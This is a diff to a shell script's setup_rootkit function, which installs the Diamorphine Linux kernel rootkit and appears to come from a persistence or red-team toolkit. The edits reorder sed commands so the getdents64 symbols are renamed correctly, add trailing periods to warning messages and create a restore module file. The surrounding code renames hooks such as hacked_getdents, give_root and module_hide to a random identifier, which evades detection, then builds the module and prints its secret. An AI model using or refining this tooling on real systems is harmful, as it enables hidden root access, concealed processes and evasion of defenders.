@@ -82,9 +82,9 @@ setup_rootkit() {
 		exit 1
 	fi
 
-    echo "[!] There are known issues with the Diamorphine rootkit for Ubuntu 22.04"
-    echo "[!] This module is tested on Debian 11, 12, RHEL 9, CentOS Stream 9 and CentOS 7"
-    echo "[!] I cannot guarantee that it will work on other distributions"
+    echo "[!] There are known issues with the Diamorphine rootkit for Ubuntu 22.04."
+    echo "[!] This module is tested on Debian 11, 12, RHEL 9, CentOS Stream 9 and CentOS 7."
+    echo "[!] I cannot guarantee that it will work on other distributions."
     sleep 5
 
     mkdir -p $rk_path
@@ -152,16 +152,16 @@ setup_rootkit() {
 	sed -i s/diamorphine.o/${identifier}.o/g ${rk_path}/Makefile
 	
 	# Original functions
-	sed -i s/orig_getdents/${identifier}_orig_getdents/g ${rk_path}/${identifier}.c
 	sed -i s/orig_getdents64/${identifier}_orig_getdents64/g ${rk_path}/${identifier}.c
+	sed -i s/orig_getdents/${identifier}_orig_getdents/g ${rk_path}/${identifier}.c
 	sed -i s/orig_kill/${identifier}_orig_kill/g ${rk_path}/${identifier}.c
 	
 	# Hooks
 	sed -i s/module_hide/${identifier}_module_hide/g ${rk_path}/${identifier}.c
 	sed -i s/module_hidden/${identifier}_module_hidden/g ${rk_path}/${identifier}.c
 	sed -i s/is_invisible/${identifier}_invisible/g ${rk_path}/${identifier}.c
-	sed -i s/hacked_getdents/${identifier}_getdents/g ${rk_path}/${identifier}.c
 	sed -i s/hacked_getdents64/${identifier}_getdents64/g ${rk_path}/${identifier}.c
+	sed -i s/hacked_getdents/${identifier}_getdents/g ${rk_path}/${identifier}.c
 	sed -i s/hacked_kill/${identifier}_kill/g ${rk_path}/${identifier}.c
 	sed -i s/give_root/${identifier}_give_root/g ${rk_path}/${identifier}.c
 	sed -i s/is_invisible/${identifier}_is_invisible/g ${rk_path}/${identifier}.c
@@ -186,6 +186,7 @@ setup_rootkit() {
 	fi
 
 	make -C ${rk_path} clean
+    touch ${rk_path}/restore_${identifier}.ko
 
 	echo "[+] Diamorphine rootkit has been installed."
     echo "[+] The secret is: ${secret}"
